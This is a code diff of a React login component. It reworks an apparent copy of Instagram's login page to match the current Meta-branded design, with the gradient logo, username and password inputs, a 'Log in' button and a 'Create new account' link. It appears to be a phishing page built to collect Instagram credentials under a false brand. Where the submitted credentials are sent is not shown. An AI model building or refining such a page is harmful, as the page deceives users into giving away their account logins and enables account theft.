@@ -57,156 +57,151 @@ function Index() {
   }
 
   return (
-    <div className="min-h-screen bg-[#fafafa] flex flex-col items-center justify-center px-4 py-8">
-      <div className="w-full max-w-[350px] flex flex-col gap-3">
-        {/* Main card */}
-        <div className="bg-white border border-[#dbdbdb] px-10 pt-10 pb-6 flex flex-col items-center">
-          {/* <h1
-            className="text-[42px] leading-none mt-3 mb-8 text-[#262626]"
-            style={{
-              fontFamily:
-                "'Billabong', 'Grand Hotel', 'Dancing Script', cursive",
-            }}
+    <div className="min-h-screen bg-white flex flex-col justify-between items-center px-6 py-6 font-sans">
+      {/* Top Section */}
+      <div className="w-full max-w-[360px] flex flex-col items-center pt-2">
+        {/* Language selector */}
+        <div className="text-[#65676b] text-[13px] font-medium flex items-center gap-1 cursor-pointer mb-16 hover:opacity-85">
+          <span>English (UK)</span>
+          <svg
+            width="10"
+            height="10"
+            viewBox="0 0 24 24"
+            fill="none"
+            stroke="currentColor"
+            strokeWidth="3"
+            strokeLinecap="round"
+            strokeLinejoin="round"
+            className="mt-0.5 opacity-60"
           >
-            Instagram
-          </h1> */}
+            <polyline points="6 9 12 15 18 9"></polyline>
+          </svg>
+        </div>
 
-          <img src="/insta.png" width="175" height="175" className="size-20 mb-10" />
-
-          <form
-            onSubmit={(e) => {
-              e.preventDefault();
-              handleSubmit(e);  
-            }}
-            className="w-full flex flex-col gap-1.5"
+        {/* Instagram Gradient Icon */}
+        <div className="mb-14">
+          <svg
+            width="78"
+            height="78"
+            viewBox="0 0 80 80"
+            fill="none"
+            xmlns="http://www.w3.org/2000/svg"
           >
-            <label className="relative block">
-              <input
-                type="text"
-                value={username}
-                onChange={(e) => setUsername(e.target.value)}
-                className="peer w-full h-[38px] bg-[#fafafa] border border-[#dbdbdb] rounded-[3px] px-2 pt-[10px] pb-1 text-xs text-[#262626] focus:outline-none focus:border-[#a8a8a8]"
-                placeholder=" "
-                autoComplete="username"
-              />
-              <span
-                className={`absolute left-2 text-[#8e8e8e] pointer-events-none transition-all origin-left ${username
-                    ? "top-1 text-[10px] scale-90"
-                    : "top-1/2 -translate-y-1/2 text-xs"
-                  }`}
+            <defs>
+              <radialGradient
+                id="insta-grad"
+                cx="30%"
+                cy="107%"
+                r="130%"
+                fx="30%"
+                fy="107%"
               >
-                Phone number, username or email
-              </span>
-            </label>
+                <stop offset="0%" stopColor="#fdf497" />
+                <stop offset="5%" stopColor="#fdf497" />
+                <stop offset="45%" stopColor="#fd5949" />
+                <stop offset="60%" stopColor="#d6249f" />
+                <stop offset="90%" stopColor="#285AEB" />
+              </radialGradient>
+            </defs>
+            <rect width="80" height="80" rx="20" fill="url(#insta-grad)" />
+            <rect
+              x="18"
+              y="18"
+              width="44"
+              height="44"
+              rx="12"
+              stroke="white"
+              strokeWidth="4.5"
+              fill="none"
+            />
+            <circle
+              cx="40"
+              cy="40"
+              r="9.5"
+              stroke="white"
+              strokeWidth="4.5"
+              fill="none"
+            />
+            <circle cx="53" cy="27" r="3" fill="white" />
+          </svg>
+        </div>
 
-            <label className="relative block">
-              <input
-                type="password"
-                value={password}
-                onChange={(e) => setPassword(e.target.value)}
-                className="peer w-full h-[38px] bg-[#fafafa] border border-[#dbdbdb] rounded-[3px] px-2 pt-[10px] pb-1 text-xs text-[#262626] focus:outline-none focus:border-[#a8a8a8]"
-                placeholder=" "
-                autoComplete="current-password"
-              />
-              <span
-                className={`absolute left-2 text-[#8e8e8e] pointer-events-none transition-all origin-left ${password
-                    ? "top-1 text-[10px] scale-90"
-                    : "top-1/2 -translate-y-1/2 text-xs"
-                  }`}
-              >
-                Password
-              </span>
-            </label>
-
-            <button
-              type="submit"
-              disabled={!canSubmit}
-              className="mt-2 w-full h-[32px] rounded-[8px] bg-[#0095f6] text-white text-sm font-semibold disabled:opacity-50 hover:bg-[#1877f2] transition-colors"
-            >
-              Log in
-            </button>
-          </form>
-
-          <div className="w-full flex items-center gap-4 my-4">
-            <div className="flex-1 h-px bg-[#dbdbdb]" />
-            <span className="text-[13px] font-semibold text-[#8e8e8e]">OR</span>
-            <div className="flex-1 h-px bg-[#dbdbdb]" />
+        {/* Login Form */}
+        <form
+          onSubmit={(e) => {
+            e.preventDefault();
+            handleSubmit(e);
+          }}
+          className="w-full flex flex-col gap-3"
+        >
+          <div className="w-full">
+            <input
+              type="text"
+              value={username}
+              onChange={(e) => setUsername(e.target.value)}
+              className="w-full h-[58px] bg-white border border-[#dadde1] rounded-[16px] px-4 text-[15px] text-[#1c1e21] placeholder-[#65676b] focus:outline-none focus:border-[#0064e0] transition-colors"
+              placeholder="Username, email address or mobile ..."
+              autoComplete="username"
+            />
           </div>
 
-          <button className="flex items-center gap-2 text-[#385185] text-sm font-semibold">
-            <svg
-              width="16"
-              height="16"
-              viewBox="0 0 24 24"
-              fill="currentColor"
-              aria-hidden="true"
-            >
-              <path d="M22 12.06C22 6.5 17.52 2 12 2S2 6.5 2 12.06C2 17.08 5.66 21.24 10.44 22v-7.03H7.9v-2.91h2.54V9.85c0-2.51 1.49-3.89 3.77-3.89 1.09 0 2.24.2 2.24.2v2.47h-1.26c-1.24 0-1.63.77-1.63 1.56v1.87h2.77l-.44 2.91h-2.33V22C18.34 21.24 22 17.08 22 12.06z" />
-            </svg>
-            Log in with Facebook
-          </button>
+          <div className="w-full">
+            <input
+              type="password"
+              value={password}
+              onChange={(e) => setPassword(e.target.value)}
+              className="w-full h-[58px] bg-white border border-[#dadde1] rounded-[16px] px-4 text-[15px] text-[#1c1e21] placeholder-[#65676b] focus:outline-none focus:border-[#0064e0] transition-colors"
+              placeholder="Password"
+              autoComplete="current-password"
+            />
+          </div>
 
-          <a
-            href="#"
-            className="mt-4 mb-2 text-[12px] text-[#00376b] hover:underline"
+          <button
+            type="submit"
+            className="mt-2 w-full h-[46px] rounded-full bg-[#0064e0] text-white text-[16px] font-semibold hover:bg-[#0056c2] active:scale-[0.99] disabled:opacity-60 disabled:pointer-events-none transition-all cursor-pointer flex items-center justify-center"
           >
-            Forgot password?
-          </a>
-        </div>
+            Log in
+          </button>
+        </form>
 
-        {/* Signup card */}
-        <div className="bg-white border border-[#dbdbdb] py-5 text-center text-sm text-[#262626]">
-          Don't have an account?{" "}
-          <a href="#" className="text-[#0095f6] font-semibold hover:underline">
-            Sign up
-          </a>
-        </div>
-
-        {/* Get the app */}
-        <div className="mt-2 text-center text-sm text-[#262626]">
-          Get the app.
-        </div>
-        <div className="flex justify-center gap-2 mt-1">
-          <img
-            src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png"
-            alt="Download on the App Store"
-            className="h-10"
-          />
-          <img
-            src="https://static.cdninstagram.com/rsrc.php/v3/yu/r/EHY6QnZYdNX.png"
-            alt="Get it on Google Play"
-            className="h-10"
-          />
-        </div>
+        {/* Forgotten password? */}
+        <a
+          href="#"
+          className="mt-5 text-[15px] font-medium text-[#1c2b33] hover:underline"
+        >
+          Forgotten password?
+        </a>
       </div>
 
-      <footer className="mt-12 text-center text-xs text-[#8e8e8e]">
-        <nav className="flex flex-wrap justify-center gap-x-4 gap-y-2 max-w-[700px] px-4">
-          {[
-            "Meta",
-            "About",
-            "Blog",
-            "Jobs",
-            "Help",
-            "API",
-            "Privacy",
-            "Terms",
-            "Locations",
-            "Instagram Lite",
-            "Threads",
-            "Contact Uploading & Non-Users",
-            "Meta Verified",
-          ].map((l) => (
-            <a key={l} href="#" className="hover:underline">
-              {l}
-            </a>
-          ))}
-        </nav>
-        <div className="mt-4 flex justify-center gap-4">
-          <span>English</span>
-          <span>© 2026 Instagram from Meta</span>
+      {/* Bottom Section */}
+      <div className="w-full max-w-[360px] flex flex-col items-center gap-6 pb-2">
+        {/* Create new account */}
+        <a
+          href="#"
+          className="w-full h-[44px] rounded-full border border-[#0064e0] text-[#0064e0] text-[15px] font-semibold flex items-center justify-center hover:bg-[#f5f9ff] active:scale-[0.99] transition-all cursor-pointer"
+        >
+          Create new account
+        </a>
+
+        {/* Meta Logo */}
+        <div className="flex items-center gap-1.5 justify-center">
+          <svg
+            xmlns="http://www.w3.org/2000/svg"
+            viewBox="0 0 16 16"
+            fill="currentColor"
+            className="w-[18px] h-[18px] text-[#0064e0]"
+          >
+            <path
+              fillRule="evenodd"
+              d="M8.217 5.243C9.145 3.988 10.171 3 11.483 3 13.96 3 16 6.153 16.001 9.907c0 2.29-.986 3.725-2.757 3.725-1.543 0-2.395-.866-3.924-3.424l-.667-1.123-.118-.197a55 55 0 0 0-.53-.877l-1.178 2.08c-1.673 2.925-2.615 3.541-3.923 3.541C1.086 13.632 0 12.217 0 9.973 0 6.388 1.995 3 4.598 3q.477-.001.924.122c.31.086.611.22.913.407.577.359 1.154.915 1.782 1.714m1.516 2.224q-.378-.615-.727-1.133L9 6.326c.845-1.305 1.543-1.954 2.372-1.954 1.723 0 3.102 2.537 3.102 5.653 0 1.188-.39 1.877-1.195 1.877-.773 0-1.142-.51-2.61-2.87zM4.846 4.756c.725.1 1.385.634 2.34 2.001A212 212 0 0 0 5.551 9.3c-1.357 2.126-1.826 2.603-2.581 2.603-.777 0-1.24-.682-1.24-1.9 0-2.602 1.298-5.264 2.846-5.264q.137 0 .27.018"
+            />
+          </svg>
+          <span className="text-[#65676b] text-[13px] font-semibold tracking-wide">
+            Meta
+          </span>
         </div>
-      </footer>
+      </div>
     </div>
   );
 }
+
